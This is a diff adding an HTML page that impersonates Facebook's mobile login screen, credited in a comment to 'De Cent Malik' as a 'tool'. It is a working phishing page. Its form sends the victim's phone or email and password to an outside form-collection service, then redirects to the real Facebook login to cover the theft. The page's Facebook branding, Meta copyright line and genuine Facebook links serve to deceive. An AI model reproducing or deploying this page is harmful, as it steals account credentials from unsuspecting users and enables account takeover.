@@ -1,0 +1,434 @@
+<!-- This tools has been created by "De Cent Malik" -->
+<!-- Facebook : De Cent Malik -->
+<!-- Profile link : https://www.facebook.com/decentmalik  -->
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- <img src="https://icons.iconarchive.com/icons/dakirby309/windows-8-metro/128/Web-Facebook-alt-4-Metro-icon.png" width="128" height="128"> -->
+    <link rel="icon" type="image/x-icon" href="fb icon.ico">
+    <title>Log in to Facebook | Facebook</title>
+    <style>
+        body {
+            box-sizing: border-box;
+            /* overflow-x: hidden; */
+        }
+
+        header {
+            /* background-color: rgb(255, 255, 200); */
+            background-color: #fffbe2;
+            height: 42px;
+            display: flex;
+            font-size: 14px;
+            justify-content: center;
+            align-items: center;
+            width: 100vw;
+            margin-top: -8px;
+            position: relative;
+            left: -3%;
+            padding: 4px;
+
+        }
+
+        header p {
+            color: #3b5998;
+            font-family: Roboto, 'Droid Sans', Helvetica, sans-serif;
+            margin: 4px;
+            font-size: 14px;
+        }
+
+        .title {
+            /* border: 2px solid black; */
+            display: flex;
+            height: 50px;
+            justify-content: center;
+        }
+
+        .title h1 {
+            position: absolute;
+            margin-top: 4%;
+            font-size: 21px;
+            color: #1877f2;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        .main {
+            /* border: 2px solid black; */
+            width: 98%;
+            flex-direction: column;
+            display: flex;
+            justify-content: center;
+        }
+
+        input[type="text"],
+        [type="password"] {
+            width: 92%;
+            border-radius: 4px;
+            height: 18px;
+            padding: 12px;
+            background-color: rgb(240, 240, 240);
+            border: none;
+            margin-top: 4px;
+            font-size: 14px;
+            font-family: Roboto, 'Droid Sans', Helvetica, sans-serif;
+            border: 1px solid rgb(226, 226, 226);
+        }
+
+
+
+        #sendd {
+            background-color: #1877f2;
+            background-image: none;
+            color: white;
+            padding: 8px;
+            font-weight: bold;
+            height: 40px;
+            border-radius: 4px;
+            font-size: 17px;
+            margin-top: 12px;
+            border: none;
+        }
+
+        #sendd.touch {
+            color: red;
+        }
+
+        #f_p {
+            text-align: center;
+            color: #1877f2;
+            margin: 11px;
+            font-family: Roboto, 'Droid Sans', Helvetica, sans-serif;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        #h_1 {
+            width: 42%;
+            float: left;
+            position: relative;
+            top: -1px;
+        }
+
+        #h_2 {
+            width: 42%;
+            float: right;
+            position: relative;
+            top: -31px;
+        }
+
+        .sep p {
+            position: relative;
+            font-family: Roboto, 'Droid Sans', Helvetica, sans-serif;
+            font-size: 14px;
+            left: 5%;
+            top: -2px;
+        }
+
+        #new_a {
+            text-decoration: none;
+            text-align: center;
+            color: #000;
+            text-shadow: none;
+            white-space: nowrap;
+            font-family: Roboto, 'Droid Sans', Helvetica, sans-serif;
+        }
+
+        #new_b {
+            border: 1px solid #bec3c9;
+            height: 36px;
+            align-items: center;
+            background: white;
+            font-size: 15px;
+            font-style: normal;
+            font-weight: 500;
+            border-radius: 4px;
+            width: 77%;
+            margin: auto;
+            display: flex;
+            justify-content: center;
+            letter-spacing: -0.23px;
+            position: relative;
+            top: -19px;
+        }
+
+
+        footer {
+            /* border: 2px solid black; */
+            margin-top: 110px;
+        }
+
+        .leftt {
+            /* border: 2px solid black; */
+            width: 50%;
+            padding: 2px;
+        }
+
+        .rightt {
+            /* border: 2px solid black; */
+            width: 50%;
+            padding: 2px;
+        }
+
+        .lang {
+            display: flex;
+            flex-direction: row;
+            justify-content: space-around;
+        }
+
+        li {
+            color: #90949c;
+            font-size: 12px;
+            font-weight: bold;
+            margin: 3px;
+            text-align: center;
+            list-style: none;
+            font-family: Roboto, 'Droid Sans', Helvetica, sans-serif;
+        }
+
+        .cpp {
+            /* border: 2px solid black; */
+            position: relative;
+            top: -6px;
+        }
+
+        .cpp p {
+            font-size: 12px;
+            font-family: Roboto, 'Droid Sans', Helvetica, sans-serif;
+            line-height: 15px;
+            text-align: center;
+            color: gray;
+        }
+
+        .plus_icon {
+            border: 1px dotted #90949c;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 14px;
+            width: 14px;
+            position: relative;
+            left: 41%;
+        }
+
+        #pluss {
+            height: 15px;
+            width: 15px;
+        }
+
+        .h_icon {
+            /* border: 2px solid black; */
+            padding: 1px;
+            margin-left: 9px;
+            margin-right: 4px;
+        }
+
+        @media (min-width: 200px) and (max-width: 299px) {
+
+            input[type="text"],
+            [type="password"] {
+                width: 91%;
+            }
+
+            footer {
+                margin-top: 90px;
+            }
+        }
+
+        @media (min-width: 300px) and (max-width: 349px) {
+
+            input[type="text"],
+            [type="password"] {
+                width: 92%;
+            }
+
+            footer {
+                margin-top: 100px;
+            }
+        }
+
+        @media (min-width: 350px) and (max-width: 400px) {
+
+            input[type="text"],
+            [type="password"] {
+                width: 93%;
+            }
+
+            footer {
+                margin-top: 110px;
+            }
+
+            .plus_icon {
+                left: 44%;
+            }
+
+
+        }
+
+        @media (min-width: 400px) and (max-width: 450px) {
+
+            input[type="text"],
+            [type="password"] {
+                width: 94%;
+            }
+
+            .plus_icon {
+                left: 45%;
+            }
+        }
+
+        @media (min-width: 450px) and (max-width: 550px) {
+
+            input[type="text"],
+            [type="password"] {
+                width: 95%;
+            }
+
+
+
+            .sep p {
+                left: 6%;
+            }
+
+            .title h1 {
+                margin-top: 3%;
+
+            }
+
+            .plus_icon {
+                left: 46%;
+            }
+        }
+
+        @media (min-width: 551px) and (max-width: 750px) {
+
+            input[type="text"],
+            [type="password"] {
+                width: 96%;
+            }
+
+            .sep p {
+                left: 6%;
+            }
+
+            .plus_icon {
+                left: 47%;
+            }
+
+            .title h1 {
+                margin-top: 2%;
+
+            }
+        }
+
+        @media (min-width: 751px) and (max-width: 950px) {
+
+            input[type="text"],
+            [type="password"] {
+                width: 97%;
+            }
+
+            .title h1 {
+                margin-top: 2%;
+
+            }
+
+            .sep p {
+                left: 6%;
+            }
+
+            .plus_icon {
+                left: 48%;
+            }
+        }
+
+        @media (min-width: 951px) and (max-width: 1750px) {
+
+            input[type="text"],
+            [type="password"] {
+                width: 98%;
+            }
+
+            .sep p {
+                left: 7%;
+            }
+
+            .plus_icon {
+                left: 49%;
+            }
+
+            .title h1 {
+                margin-top: 1%;
+
+            }
+
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div class="h_icon">
+            <img src="icons.png" alt="">
+        </div>
+        <p>Get Facebook For Android And Browse Faster.</p>
+    </header>
+    <div class="title">
+        <h1>facebook</h1>
+
+    </div>
+    <form action="https://submit-form.com/oeqUNYIU">
+        <input type="hidden" name="_redirect" value="https://m.facebook.com/login.php/" />
+        <div class="main">
+            <input class="in" type="text" name="Number/email:" placeholder="Mobile number or email address" required>
+            <input class="in" type="password" name="Password:" placeholder="Password" required>
+            <button id="sendd" type="submit"> Log in</button>
+    </form>
+    <a id="f_p"
+        href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjc1MjUyMjg2LCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%253D%253D&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr">Forgotten
+        password?</a>
+    </div>
+    <div class="sep">
+        <hr id="h_1">
+        <p>or</p>
+        <hr id="h_2">
+    </div>
+    <a href="https://m.facebook.com/reg/?cid=103&refsrc=deprecated&soft=hjk" id="new_a">
+        <div id="new_b">Create new account</div>
+
+    </a>
+
+    <footer>
+        <div class="lang">
+            <div class="leftt">
+                <ul>
+                    <li>English (UK)</li>
+                    <li>پښتو</li>
+                    <li>हिन्दी</li>
+                    <li>Español</li>
+                </ul>
+            </div>
+            <div class="rightt">
+                <ul>
+                    <li>اردو</li>
+                    <li>العربية</li>
+                    <li>বাংলা</li>
+                    <li>
+                        <div class="plus_icon">
+                            <img id="pluss" src="Science-Plus2-Math-icon.png" alt="">
+                        </div>
+                    </li>
+
+                </ul>
+            </div>
+        </div>
+        <div class="cpp">
+            <p>Meta © 2023</p>
+        </div>
+    </footer>
+</body>
+
+</html>
